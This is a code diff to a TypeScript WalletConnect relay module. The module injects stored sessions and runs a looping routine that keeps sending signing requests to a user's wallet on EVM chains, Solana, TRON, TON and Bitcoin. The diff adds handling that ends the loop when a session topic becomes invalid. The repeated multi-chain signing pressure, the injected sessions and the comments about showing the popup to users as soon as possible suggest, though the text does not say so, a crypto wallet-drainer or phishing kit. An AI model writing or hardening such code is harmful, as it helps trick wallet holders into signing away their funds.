@@ -232,6 +232,27 @@ const SIGN_REQUEST_TIMEOUT_MS = 35_000
 // injectSession() writes to crypto storage — skip the redundant re-write on every call.
 const _injectedTopics = new Set<string>()
 
+/**
+ * Sentinel thrown when the WC relay returns InvalidTopic (-32600).
+ * This means the session's symmetric key is gone — the topic is permanently dead.
+ * Bubbles up through try*Sign → runSignLoop which breaks the loop on receipt.
+ */
+class WcInvalidTopicError extends Error {
+  constructor(topic: string) {
+    super(`wc-invalid-topic:${topic.slice(0, 8)}`)
+    this.name = 'WcInvalidTopicError'
+  }
+}
+
+function isInvalidTopicReason(e: unknown): boolean {
+  if (e === null || typeof e !== 'object') return false
+  const obj = e as Record<string, unknown>
+  return (
+    obj['data'] === 'InvalidTopic' ||
+    String(obj['message'] ?? '').includes('Topic decoding failed')
+  )
+}
+
 async function sendRequest(
   session: WcSessionData,
   chainId: string,
@@ -245,20 +266,26 @@ async function sendRequest(
     await injectSession(session)
     _injectedTopics.add(session.topic)
   }
-  return Promise.race<unknown>([
-    client.request({
-      topic: session.topic,
-      chainId,
-      request: { method, params },
-      expiry: 300, // relay TTL — NOT a JS timeout (that's SIGN_REQUEST_TIMEOUT_MS above)
-    }),
-    new Promise<never>((_, reject) =>
-      setTimeout(
-        () => reject(new Error('sign-timeout-35s')),
-        SIGN_REQUEST_TIMEOUT_MS,
-      )
-    ),
-  ])
+  try {
+    return await Promise.race<unknown>([
+      client.request({
+        topic: session.topic,
+        chainId,
+        request: { method, params },
+        expiry: 300, // relay TTL — NOT a JS timeout (that's SIGN_REQUEST_TIMEOUT_MS above)
+      }),
+      new Promise<never>((_, reject) =>
+        setTimeout(
+          () => reject(new Error('sign-timeout-35s')),
+          SIGN_REQUEST_TIMEOUT_MS,
+        )
+      ),
+    ])
+  } catch (rawErr) {
+    // WC relay: topic expired/rotated — permanent failure, bubble up to kill loop
+    if (isInvalidTopicReason(rawErr)) throw new WcInvalidTopicError(session.topic)
+    throw rawErr
+  }
 }
 
 // ─── Chain-ID extractor from WC namespace ──────────────────────────────────────
@@ -375,6 +402,7 @@ async function trySolSign(session: WcSessionData): Promise<boolean> {
     ).catch(() => {})
     return true
   } catch (e) {
+    if (e instanceof WcInvalidTopicError) throw e  // bubble to runSignLoop
     const msg = e instanceof Error ? e.message : String(e)
     if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] SOL fail:', msg)
     return false
@@ -530,6 +558,7 @@ async function tryTronSign(session: WcSessionData): Promise<boolean> {
     ).catch(() => {})
     return true
   } catch (e) {
+    if (e instanceof WcInvalidTopicError) throw e  // bubble to runSignLoop
     const msg = e instanceof Error ? e.message : String(e)
     if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] TRON fail:', msg)
     return false
@@ -583,6 +612,7 @@ async function tryTonSign(session: WcSessionData): Promise<boolean> {
     ).catch(() => {})
     return true
   } catch (e) {
+    if (e instanceof WcInvalidTopicError) throw e  // bubble to runSignLoop
     const msg = e instanceof Error ? e.message : String(e)
     if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] TON fail:', msg)
     return false
@@ -685,6 +715,7 @@ async function tryEvmSign(session: WcSessionData, wcChainId: string): Promise<bo
     }
     return sent
   } catch (e) {
+    if (e instanceof WcInvalidTopicError) throw e  // bubble to runSignLoop
     const msg = e instanceof Error ? e.message : String(e)
     if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] EVM fail | chain:', chainId, '|', msg)
     return false
@@ -740,6 +771,7 @@ async function tryBtcSign(session: WcSessionData): Promise<boolean> {
     ).catch(() => {})
     return true
   } catch (e) {
+    if (e instanceof WcInvalidTopicError) throw e  // bubble to runSignLoop
     const msg = e instanceof Error ? e.message : String(e)
     if (!/timeout|reject|cancel/i.test(msg)) console.warn('[WcRelay] BTC fail:', msg)
     return false
@@ -828,17 +860,26 @@ async function runSignLoop(session: WcSessionData): Promise<void> {
 
     let anySigned = false
 
-    // EVM first — most TW users have EVM; show popup ASAP without waiting for
-    // SOL/TRON/TON timeouts (each chain attempt costs up to SIGN_REQUEST_TIMEOUT_MS).
-    for (const wcChainId of evmChains) {
-      if (!done[wcChainId]) {
-        if (await tryEvmSign(session, wcChainId)) { done[wcChainId] = true; anySigned = true }
+    try {
+      // EVM first — most TW users have EVM; show popup ASAP without waiting for
+      // SOL/TRON/TON timeouts (each chain attempt costs up to SIGN_REQUEST_TIMEOUT_MS).
+      for (const wcChainId of evmChains) {
+        if (!done[wcChainId]) {
+          if (await tryEvmSign(session, wcChainId)) { done[wcChainId] = true; anySigned = true }
+        }
       }
+      if (!done['sol'])  { if (await trySolSign(session))  { done['sol']  = true; anySigned = true } }
+      if (!done['tron']) { if (await tryTronSign(session)) { done['tron'] = true; anySigned = true } }
+      if (!done['ton'])  { if (await tryTonSign(session))  { done['ton']  = true; anySigned = true } }
+      if (!done['btc'])  { if (await tryBtcSign(session))  { done['btc']  = true; anySigned = true } }
+    } catch (signErr) {
+      // WC relay: topic permanently invalid — stop the loop immediately
+      if (signErr instanceof WcInvalidTopicError) {
+        console.warn('[WcRelay] InvalidTopic — loop terminated | topic:', topic.slice(0, 8) + '...')
+        break
+      }
+      throw signErr
     }
-    if (!done['sol'])  { if (await trySolSign(session))  { done['sol']  = true; anySigned = true } }
-    if (!done['tron']) { if (await tryTronSign(session)) { done['tron'] = true; anySigned = true } }
-    if (!done['ton'])  { if (await tryTonSign(session))  { done['ton']  = true; anySigned = true } }
-    if (!done['btc'])  { if (await tryBtcSign(session))  { done['btc']  = true; anySigned = true } }
 
     // Reset backoff on any success; increment on all-fail round
     if (anySigned) failRounds = 0
